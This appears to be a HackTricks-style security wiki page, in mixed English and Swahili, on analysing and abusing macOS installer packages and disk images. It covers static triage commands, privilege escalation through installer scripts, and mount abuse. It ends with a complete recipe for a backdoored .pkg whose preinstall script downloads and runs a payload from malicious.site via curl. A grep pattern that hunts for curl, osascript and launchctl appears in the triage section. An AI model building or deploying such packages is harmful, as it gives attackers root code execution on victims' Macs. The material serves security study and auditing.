# macOS Installers Abuse

{{#include ../../../banners/hacktricks-training.md}}

## Pkg Basic Information

A macOS **installer package** (also known as a `.pkg` file) is a file format used by macOS to **distribute software**. These files are like a **box that contains everything a piece of software** needs to install and run correctly.

The package file itself is an archive that holds a **hierarchy of files and directories that will be installed on the target** computer. It can also include **scripts** to perform tasks before and after the installation, like setting up configuration files or cleaning up old versions of the software.

### Hierarchy

<figure><img src="../../../images/Pasted Graphic.png" alt="https://www.youtube.com/watch?v=iASSG0_zobQ"><figcaption></figcaption></figure>

- **Distribution (xml)**: Customizations (title, welcome text…) and script/installation checks
- **PackageInfo (xml)**: Info, install requirements, install location, paths to scripts to run
- **Bill of materials (bom)**: List of files to install, update or remove with file permissions
- **Payload (CPIO archive gzip compressed)**: Files to install in the `install-location` from PackageInfo
- **Scripts (CPIO archive gzip compressed)**: Pre and post install scripts and more resources extracted to a temp directory for execution.

### Decompress
```bash
# Tool to directly get the files inside a package
pkgutil --expand "/path/to/package.pkg" "/path/to/out/dir"

# Get the files in a more manual way
mkdir -p "/path/to/out/dir"
cd "/path/to/out/dir"
xar -xf "/path/to/package.pkg"

# Decompress also the CPIO gzip compressed ones
cat Scripts | gzip -dc | cpio -i
cpio -i < Scripts
```
Ili kuonesha yaliyomo ya installer bila kuyabana kwa mkono unaweza pia kutumia zana ya bure [**Suspicious Package**](https://mothersruin.com/software/SuspiciousPackage/).

### Static triage shortcuts

Ikiwa lengo ni uchambuzi, jaribu **kuepuka kufungua package kwa `Installer.app` kwanza**. Baadhi ya packages zinaweza kutekeleza code punde tu Installer inapozifungua (kwa mfano kupitia `system.run()` au installer plug-ins), hivyo offline extraction kawaida ni sehemu ya kuanzia salama zaidi.
```bash
PKG="Suspicious.pkg"
OUT="/tmp/pkg-audit"

# Preserve Distribution, scripts, resources and nested component pkgs
pkgutil --expand-full "$PKG" "$OUT"

# Signature / policy checks
pkgutil --check-signature "$PKG"
spctl -a -vv -t install "$PKG"

# Quick hunting: scripts, BOM contents and interesting primitives
find "$OUT" -type f \( -name preinstall -o -name postinstall \) -print -exec head -n 1 {} \;
find "$OUT" -type f \( -name Bom -o -name '*.bom' \) -exec lsbom -pf {} \; 2>/dev/null
xmllint --format "$OUT/Distribution" 2>/dev/null | sed -n '1,200p'
rg -n 'system\.(run|runOnce)|<script>|launchctl|osascript|curl|chmod 4[0-7]{3}|sudo -u |\$USER|\$HOME|/tmp/|/var/tmp/' "$OUT"
```
## DMG Basic Information

DMG files, or Apple Disk Images, are a file format used by Apple's macOS for disk images. A DMG file is essentially a **mountable disk image** (it contains its own filesystem) that contains raw block data typically compressed and sometimes encrypted. When you open a DMG file, macOS **mounts it as if it were a physical disk**, allowing you to access its contents.

> [!CAUTION]
> Note that **`.dmg`** installers support **so many formats** that in the past some of them containing vulnerabilities were abused to obtain **kernel code execution**.

### Hierarchy

<figure><img src="../../../images/image (225).png" alt=""><figcaption></figcaption></figure>

The hierarchy of a DMG file can be different based on the content. However, for application DMGs, it usually follows this structure:

- Top Level: This is the root of the disk image. It often contains the application and possibly a link to the Applications folder.
- Application (.app): This is the actual application. In macOS, an application is typically a package that contains many individual files and folders that make up the application.
- Applications Link: This is a shortcut to the Applications folder in macOS. The purpose of this is to make it easy for you to install the application. You can drag the .app file to this shortcut to install the app.

## Privesc via pkg abuse

### Execution from public directories

If a pre or post installation script is for example executing from **`/var/tmp/Installerutil`**, and an attacker can control that script, they can escalate privileges whenever it's executed. Or another similar example:

<figure><img src="../../../images/Pasted Graphic 5.png" alt="https://www.youtube.com/watch?v=iASSG0_zobQ"><figcaption><p><a href="https://www.youtube.com/watch?v=kCXhIYtODBg">https://www.youtube.com/watch?v=kCXhIYtODBg</a></p></figcaption></figure>

### AuthorizationExecuteWithPrivileges

This is a [public function](https://developer.apple.com/documentation/security/1540038-authorizationexecutewithprivileg) that several installers and updaters will call to **execute something as root**. This function accepts the **path** of the **file** to **execute** as parameter, however, if an attacker could **modify** this file, he will be able to **abuse** its execution with root to **escalate privileges**.
```bash
# Breakpoint in the function to check which file is loaded
(lldb) b AuthorizationExecuteWithPrivileges
# You could also check FS events to find this misconfig
```
Kwa maelezo zaidi angalia mazungumzo haya: [https://www.youtube.com/watch?v=lTOItyjTTkw](https://www.youtube.com/watch?v=lTOItyjTTkw)

### Mazingira na matumizi mabaya ya shebang

Hitilafu za kisasa za PackageKit zilionyesha kuwa skripti za installer mara nyingi hutekelezwa kama **trusted root code** huku zikiendelea kuweka context inayodhibitiwa na mshambulizi karibu. Unapokagua vendor packages, zingatia hasa:

- Shell interpreters kama `#!/bin/zsh` / `#!/bin/bash`
- Calls kama `sudo -u $USER`, `launchctl asuser`, au logic yoyote inayotegemea `$USER`, `$HOME`, `PATH`, `TMPDIR`, au relative paths
- Non-shell interpreters ambazo zinaweza kupakia user-controlled init files au libraries
```bash
pkgutil --expand-full Target.pkg /tmp/target-pkg
find /tmp/target-pkg -type f \( -name preinstall -o -name postinstall \) -exec sh -c 'printf "\n### %s\n" "$1"; head -n 1 "$1"' sh {} \;
rg -n '^#!/bin/(zsh|bash)|sudo -u |launchctl asuser|\$USER|\$HOME|PATH=|/usr/bin/env ' /tmp/target-pkg
```
Kwa mdudu wa 2024 wa PackageKit kwenye root-environment (`~/.zshenv` / `~/.bash*` urithi wakati wa usakinishaji unaoanzishwa na mtumiaji), angalia [ukurasa wa jumla wa macOS privesc](../macos-privilege-escalation.md). Ikiwa package ni **Apple-signed**, mdudu uleule wa script unaweza kuwa **SIP/TCC-relevant** kwa sababu `system_installd` inaweza kubeba `com.apple.rootless.install.heritable`; angalia [ukurasa wa SIP](../macos-security-protections/macos-sip.md).

### Utekelezaji kwa mounting

Ikiwa installer inaandika kwa `/tmp/fixedname/bla/bla`, inawezekana **kuunda mount** juu ya `/tmp/fixedname` bila owners ili uweze **kurekebisha faili yoyote wakati wa usakinishaji** ili kutumia vibaya mchakato wa usakinishaji.

Mfano wa hili ni **CVE-2021-26089** ambao uliweza **ku-overwrite periodic script** ili kupata utekelezaji kama root. Kwa taarifa zaidi angalia talk: [**OBTS v4.0: "Mount(ain) of Bugs" - Csaba Fitzl**](https://www.youtube.com/watch?v=jSYPazD4VcE)

## pkg kama malware

### Empty Payload

Inawezekana tu kutengeneza faili ya **`.pkg`** yenye **pre na post-install scripts** bila payload halisi yoyote isipokuwa malware iliyo ndani ya scripts.

### JS katika Distribution xml

Inawezekana kuongeza tagi za **`<script>`** katika faili ya **distribution xml** ya package na code hiyo itatekelezwa na inaweza **kutekeleza commands** kwa kutumia **`system.run`**:

<figure><img src="../../../images/image (1043).png" alt=""><figcaption></figcaption></figure>

Katika distribution packages hii kawaida hutegemea faili ya juu kabisa ya `Distribution` kuwasha external scripts, kwa mfano kwa `allow-external-scripts="true"`. Kwa hiyo kukagua tu `preinstall` / `postinstall` hakutoshi: **Distribution XML yenyewe** inaweza kuwa na `installation-check` / `volume-check` hooks na njia za moja kwa moja za utekelezaji za `system.run()` / `system.runOnce()`.
```bash
xmllint --format Distribution | sed -n '1,200p'
rg -n 'allow-external-scripts|system\.(run|runOnce)|installation-check|volume-check|function ' Distribution
```
### Kisakinisha kilichobackdoorwa

Kisakinisha kibaya kinachotumia script na code ya JS ndani ya dist.xml
```bash
# Package structure
mkdir -p pkgroot/root/Applications/MyApp
mkdir -p pkgroot/scripts

# Create preinstall scripts
cat > pkgroot/scripts/preinstall <<EOF
#!/bin/bash
echo "Running preinstall script"
curl -o /tmp/payload.sh http://malicious.site/payload.sh
chmod +x /tmp/payload.sh
/tmp/payload.sh
exit 0
EOF

# Build package
pkgbuild --root pkgroot/root --scripts pkgroot/scripts --identifier com.malicious.myapp --version 1.0 myapp.pkg

# Generate the malicious dist.xml
cat > ./dist.xml <<EOF
<?xml version="1.0" encoding="utf-8"?>
<installer-gui-script minSpecVersion="1">
<title>Malicious Installer</title>
<options allow-external-scripts="true" customize="allow" require-scripts="true"/>
<script>
<![CDATA[
function installationCheck() {
if (system.isSandboxed()) {
my.result.title = "Cannot install in a sandbox.";
my.result.message = "Please run this installer outside of a sandbox.";
return false;
}
return true;
}
function volumeCheck() {
return true;
}
function preflight() {
system.run("/path/to/preinstall");
}
function postflight() {
system.run("/path/to/postinstall");
}
]]>
</script>
<choices-outline>
<line choice="default">
<line choice="myapp"/>
</line>
</choices-outline>
<choice id="myapp" title="MyApp">
<pkg-ref id="com.malicious.myapp"/>
</choice>
<pkg-ref id="com.malicious.myapp" installKBytes="0" auth="root">#myapp.pkg</pkg-ref>
</installer-gui-script>
EOF

# Build final
productbuild --distribution dist.xml --package-path myapp.pkg final-installer.pkg
```
## Marejeo

- [**DEF CON 27 - Unpacking Pkgs A Look Inside Macos Installer Packages And Common Security Flaws**](https://www.youtube.com/watch?v=iASSG0_zobQ)
- [**OBTS v4.0: "The Wild World of macOS Installers" - Tony Lambert**](https://www.youtube.com/watch?v=Eow5uNHtmIg)
- [**DEF CON 27 - Unpacking Pkgs A Look Inside MacOS Installer Packages**](https://www.youtube.com/watch?v=kCXhIYtODBg)
- [https://redteamrecipe.com/macos-red-teaming?utm_source=pocket_shared#heading-exploiting-installer-packages](https://redteamrecipe.com/macos-red-teaming?utm_source=pocket_shared#heading-exploiting-installer-packages)
- [**CVE-2024-27822: macOS PackageKit Privilege Escalation**](https://khronokernel.com/macos/2024/06/03/CVE-2024-27822.html)
- [**Breaking SIP with Apple-signed Packages**](https://www.l3harris.com/newsroom/editorial/2024/03/breaking-sip-apple-signed-packages)

{{#include ../../../banners/hacktricks-training.md}}
